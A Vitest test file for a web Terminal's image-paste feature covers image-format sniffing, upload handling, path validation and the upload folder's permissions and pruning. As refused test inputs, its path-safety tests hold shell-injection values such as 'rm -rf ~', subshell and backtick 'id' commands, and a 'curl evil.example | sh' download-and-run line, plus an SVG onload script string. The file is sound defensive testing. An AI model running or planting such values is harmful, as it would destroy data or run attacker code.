/**
 * Pasting a picture into the Terminal: what counts as a picture, what path the
 * Terminal will type, what the upload answers, and what the box keeps.
 */
import fs from "fs";
import os from "os";
import path from "path";
import { afterAll, beforeEach, describe, expect, it, vi } from "vitest";
import {
  TERMINAL_PASTE_MAX_BYTES,
  TERMINAL_PASTE_ROUTE,
  asPictureTaker,
  bracketedPaste,
  isSafePastedPath,
  pastedImageFiles,
  pastedText,
  sniffPastedImage,
  uploadPastedImage,
} from "@/lib/terminal-paste";
import {
  TERMINAL_PASTE_MAX_AGE_MS,
  TERMINAL_PASTE_MAX_TOTAL_BYTES,
  TerminalPasteError,
  pruneTerminalPastes,
  savePastedImage,
  terminalPasteDir,
} from "@/lib/terminal-paste-store";
import { isPlainCtrlV, terminalShortcut } from "@/lib/terminal-keys";

const PNG = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);

describe("sniffPastedImage", () => {
  it.each([
    ["png", [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]],
    ["jpg", [0xff, 0xd8, 0xff, 0xe1]],
    ["gif", [0x47, 0x49, 0x46, 0x38, 0x37, 0x61]],
    ["gif", [0x47, 0x49, 0x46, 0x38, 0x39, 0x61]],
    ["webp", [0x52, 0x49, 0x46, 0x46, 9, 9, 9, 9, 0x57, 0x45, 0x42, 0x50]],
  ] as const)("knows a %s by its first bytes", (format, bytes) => {
    expect(sniffPastedImage(new Uint8Array(bytes))).toBe(format);
  });

  it.each([
    ["nothing", []],
    ["text", [...new TextEncoder().encode("<svg onload=alert(1)>")]],
    ["a BMP, which a pasted path may not name", [0x42, 0x4d, 0, 0, 0, 0]],
    ["a RIFF that is a WAV", [0x52, 0x49, 0x46, 0x46, 9, 9, 9, 9, 0x57, 0x41, 0x56, 0x45]],
    ["a truncated PNG signature", [0x89, 0x50, 0x4e, 0x47]],
    ["GIF with a made-up version", [0x47, 0x49, 0x46, 0x38, 0x38, 0x61]],
  ] as const)("refuses %s", (_what, bytes) => {
    expect(sniffPastedImage(new Uint8Array(bytes))).toBeNull();
  });
});

describe("what a paste carries", () => {
  const file = (name: string, type: string) => new File([PNG], name, { type });

  it("finds the pictures and nothing else", () => {
    const shot = file("image.png", "image/png");
    const photo = file("photo.jpg", "image/jpeg");
    const items = [
      { kind: "string", type: "text/html", getAsFile: () => null },
      { kind: "file", type: "image/png", getAsFile: () => shot },
      { kind: "file", type: "application/pdf", getAsFile: () => file("a.pdf", "application/pdf") },
      { kind: "file", type: "image/jpeg", getAsFile: () => photo },
      // A browser that names the type and then has no file for it.
      { kind: "file", type: "image/png", getAsFile: () => null },
    ];
    expect(pastedImageFiles({ items })).toEqual([shot, photo]);
  });

  it("is empty for a paste of text, and for no clipboard data at all", () => {
    expect(pastedImageFiles({ items: [{ kind: "string", type: "text/plain", getAsFile: () => null }] })).toEqual([]);
    expect(pastedImageFiles({})).toEqual([]);
    expect(pastedImageFiles(null)).toEqual([]);
  });

  it("reads the text, and survives a clipboard that will not say", () => {
    expect(pastedText({ getData: (format) => (format === "text/plain" ? "ls -la" : "") })).toBe("ls -la");
    expect(pastedText({ getData: () => { throw new Error("no"); } })).toBe("");
    expect(pastedText(null)).toBe("");
  });
});

describe("isSafePastedPath: what the Terminal will type at the owner's prompt", () => {
  it.each([
    "/home/clawbox/.cache/clawbox/terminal-paste/paste-20261011-193355-1a2b3c4d.png",
    "/home/clawbox/.cache/clawbox/terminal-paste/paste-20261011-193355-5e6f7a8b.jpg",
    "/x/a.jpeg", "/x/a.gif", "/x/a.webp",
  ])("accepts %s", (value) => {
    expect(isSafePastedPath(value)).toBe(true);
  });

  it.each([
    ["relative", "paste.png"],
    ["a space", "/home/clawbox/my pictures/a.png"],
    ["a command separator", "/tmp/a.png;rm -rf ~;.png"],
    ["a newline, which is Enter", "/tmp/a.png\n.png"],
    ["a subshell", "/tmp/$(id).png"],
    ["a backtick", "/tmp/`id`.png"],
    ["a quote", "/tmp/a'.png"],
    ["a parent hop", "/home/clawbox/../root/a.png"],
    ["another extension", "/tmp/a.sh"],
    ["an escape sequence", "/tmp/\x1b[201~a.png"],
    ["not a string", 42],
    ["nothing", undefined],
  ])("refuses %s", (_what, value) => {
    expect(isSafePastedPath(value)).toBe(false);
  });
});

describe("asPictureTaker: the box's answer, and nothing else", () => {
  it("is the two answers the box gives", () => {
    expect(asPictureTaker("claude")).toBe("claude");
    expect(asPictureTaker("shell")).toBe("shell");
  });

  it.each([null, undefined, "", "vim", "bash", "CLAUDE", true, 1, {}])("is no for %s", (value) => {
    expect(asPictureTaker(value)).toBeNull();
  });
});

describe("bracketedPaste", () => {
  it("marks the text as a paste", () => {
    expect(bracketedPaste("/x/a.png")).toBe("\x1b[200~/x/a.png\x1b[201~");
  });
});

describe("uploadPastedImage", () => {
  const image = () => new Blob([PNG], { type: "image/png" });
  const answer = (status: number, body: unknown) => vi.fn(async () => new Response(JSON.stringify(body), { status }));

  it("posts the picture itself and answers the path", async () => {
    const fetchImpl = answer(201, { ok: true, path: "/home/clawbox/.cache/clawbox/terminal-paste/paste-1.png" });
    const blob = image();
    expect(await uploadPastedImage(blob, fetchImpl as unknown as typeof fetch)).toEqual({
      ok: true,
      path: "/home/clawbox/.cache/clawbox/terminal-paste/paste-1.png",
    });
    expect(fetchImpl).toHaveBeenCalledWith(TERMINAL_PASTE_ROUTE, expect.objectContaining({
      method: "POST",
      headers: { "content-type": "image/png" },
      body: blob,
    }));
    // Bounded: a request that never settles would hold the Terminal's notice up for good.
    const init = (fetchImpl.mock.calls[0] as unknown as [string, RequestInit])[1];
    expect(init.signal).toBeInstanceOf(AbortSignal);
  });

  it("says too large before sending anything", async () => {
    const fetchImpl = vi.fn();
    const big = image();
    Object.defineProperty(big, "size", { value: TERMINAL_PASTE_MAX_BYTES + 1 });
    expect(await uploadPastedImage(big, fetchImpl as unknown as typeof fetch)).toEqual({ ok: false, code: "too_large" });
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it("says empty before sending anything", async () => {
    const fetchImpl = vi.fn();
    expect(await uploadPastedImage(new Blob([]), fetchImpl as unknown as typeof fetch)).toEqual({ ok: false, code: "empty" });
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it.each(["owner_only", "not_an_image", "disk_full", "too_large", "cross_origin"] as const)("relays the route's own refusal: %s", async (code) => {
    expect(await uploadPastedImage(image(), answer(403, { error: "no", code }) as unknown as typeof fetch)).toEqual({ ok: false, code });
  });

  it("calls a refusal it does not know unknown, never a made-up code", async () => {
    expect(await uploadPastedImage(image(), answer(500, { code: "kernel_panic" }) as unknown as typeof fetch)).toEqual({ ok: false, code: "unknown" });
    const html = vi.fn(async () => new Response("<html>502</html>", { status: 502 }));
    expect(await uploadPastedImage(image(), html as unknown as typeof fetch)).toEqual({ ok: false, code: "unknown" });
  });

  it("never hands back a path it would not type, even from a 201", async () => {
    const fetchImpl = answer(201, { ok: true, path: "/tmp/a.png; curl evil.example | sh #.png" });
    expect(await uploadPastedImage(image(), fetchImpl as unknown as typeof fetch)).toEqual({ ok: false, code: "unknown" });
  });

  it("reports a request that never got there, without throwing", async () => {
    const down = vi.fn(async () => { throw new TypeError("Failed to fetch"); });
    expect(await uploadPastedImage(image(), down as unknown as typeof fetch)).toEqual({ ok: false, code: "network" });
  });
});

describe("the paste folder on the box", () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "clawbox-terminal-paste-"));
  const dir = terminalPasteDir(home);

  beforeEach(() => {
    fs.rmSync(home, { recursive: true, force: true });
    fs.mkdirSync(home, { recursive: true });
  });
  afterAll(() => fs.rmSync(home, { recursive: true, force: true }));

  it("is in the account's own cache folder", () => {
    expect(dir).toBe(path.join(home, ".cache", "clawbox", "terminal-paste"));
  });

  it("saves under a name of its own making, private to the account", () => {
    const saved = savePastedImage(PNG, dir, new Date(Date.UTC(2026, 9, 11, 19, 33, 55)));
    expect(saved.name).toMatch(/^paste-20261011-193355-[0-9a-f]{8}\.png$/);
    expect(saved.path).toBe(path.join(dir, saved.name));
    expect(saved).toMatchObject({ size: PNG.byteLength, format: "png" });
    expect(fs.statSync(saved.path).mode & 0o777).toBe(0o600);
    expect(fs.statSync(dir).mode & 0o777).toBe(0o700);
    expect(isSafePastedPath(saved.path.replace(home, "/home/clawbox"))).toBe(true);
  });

  it("tightens a folder that was left open", () => {
    fs.mkdirSync(dir, { recursive: true, mode: 0o755 });
    fs.chmodSync(dir, 0o755);
    savePastedImage(PNG, dir);
    expect(fs.statSync(dir).mode & 0o777).toBe(0o700);
  });

  it.each([
    ["empty", new Uint8Array(), 400],
    ["not_an_image", new TextEncoder().encode("hello"), 415],
    ["too_large", Object.assign(new Uint8Array(TERMINAL_PASTE_MAX_BYTES + 1), {}), 413],
  ] as const)("refuses %s with its own code", (code, bytes, status) => {
    let thrown: unknown;
    try { savePastedImage(bytes, dir); } catch (err) { thrown = err; }
    expect(thrown).toBeInstanceOf(TerminalPasteError);
    expect(thrown).toMatchObject({ code, status });
    expect(fs.existsSync(dir)).toBe(false);
  });

  it("refuses a folder that is a link, and writes nothing through it", () => {
    const elsewhere = path.join(home, "elsewhere");
    fs.mkdirSync(elsewhere);
    fs.mkdirSync(path.dirname(dir), { recursive: true });
    fs.symlinkSync(elsewhere, dir);
    expect(() => savePastedImage(PNG, dir)).toThrowError(expect.objectContaining({ code: "unsafe_folder" }));
    expect(fs.readdirSync(elsewhere)).toEqual([]);
  });

  describe("pruning", () => {
    const NOW = Date.UTC(2026, 9, 11, 12, 0, 0);
    const put = (name: string, ageMs: number, size = 10) => {
      fs.mkdirSync(dir, { recursive: true });
      const file = path.join(dir, name);
      fs.writeFileSync(file, new Uint8Array(size));
      const when = new Date(NOW - ageMs);
      fs.utimesSync(file, when, when);
      return file;
    };
    const DAY = 24 * 60 * 60 * 1000;

    it("removes its own files once they have aged out, and no other", () => {
      const old = put("paste-20261001-000000-aaaaaaaa.png", TERMINAL_PASTE_MAX_AGE_MS + DAY);
      const recent = put("paste-20261010-000000-bbbbbbbb.png", DAY);
      // A person can open this folder: a file this module did not name is theirs.
      const theirs = put("holiday.png", 400 * DAY);
      const lookalike = put("paste-notes.txt", 400 * DAY);
      pruneTerminalPastes(dir, NOW);
      expect(fs.existsSync(old)).toBe(false);
      expect(fs.existsSync(recent)).toBe(true);
      expect(fs.existsSync(theirs)).toBe(true);
      expect(fs.existsSync(lookalike)).toBe(true);
    });

    it("trims the oldest first once the folder is over its cap", () => {
      const third = Math.ceil(TERMINAL_PASTE_MAX_TOTAL_BYTES / 3) + 1024;
      const oldest = put("paste-20261008-000000-aaaaaaaa.png", 3 * DAY, third);
      const middle = put("paste-20261009-000000-bbbbbbbb.png", 2 * DAY, third);
      const newest = put("paste-20261010-000000-cccccccc.png", DAY, third);
      pruneTerminalPastes(dir, NOW);
      expect(fs.existsSync(oldest)).toBe(false);
      expect(fs.existsSync(middle)).toBe(true);
      expect(fs.existsSync(newest)).toBe(true);
    });

    it("never removes a file young enough to be a save in flight", () => {
      const third = Math.ceil(TERMINAL_PASTE_MAX_TOTAL_BYTES / 2) + 1024;
      const a = put("paste-20261011-115950-aaaaaaaa.png", 10_000, third);
      const b = put("paste-20261011-115955-bbbbbbbb.png", 5_000, third);
      pruneTerminalPastes(dir, NOW);
      expect(fs.existsSync(a)).toBe(true);
      expect(fs.existsSync(b)).toBe(true);
    });

    it("does nothing, quietly, where there is no folder", () => {
      expect(() => pruneTerminalPastes(path.join(home, "nope"), NOW)).not.toThrow();
    });
  });
});

describe("isPlainCtrlV", () => {
  const key = (over: Partial<Parameters<typeof isPlainCtrlV>[0]>) =>
    ({ key: "v", code: "KeyV", ctrlKey: true, shiftKey: false, altKey: false, metaKey: false, ...over });

  it("is Ctrl and V and nothing else", () => {
    expect(isPlainCtrlV(key({}))).toBe(true);
    expect(isPlainCtrlV(key({ key: "V" }))).toBe(true);
    expect(isPlainCtrlV(key({ shiftKey: true }))).toBe(false);
    expect(isPlainCtrlV(key({ altKey: true }))).toBe(false);
    expect(isPlainCtrlV(key({ metaKey: true }))).toBe(false);
    expect(isPlainCtrlV(key({ ctrlKey: false }))).toBe(false);
    expect(isPlainCtrlV(key({ key: "c", code: "KeyC" }))).toBe(false);
  });

  it("is the same key on a layout whose V types another letter", () => {
    // Bulgarian phonetic: the V key types "ж".
    expect(isPlainCtrlV(key({ key: "ж" }))).toBe(true);
  });

  it("is not one of the Terminal's own shortcuts: Ctrl+Shift+V stays the text paste", () => {
    expect(terminalShortcut(key({}), false)).toBeNull();
    expect(terminalShortcut(key({ shiftKey: true }), false)).toBe("paste");
  });
});
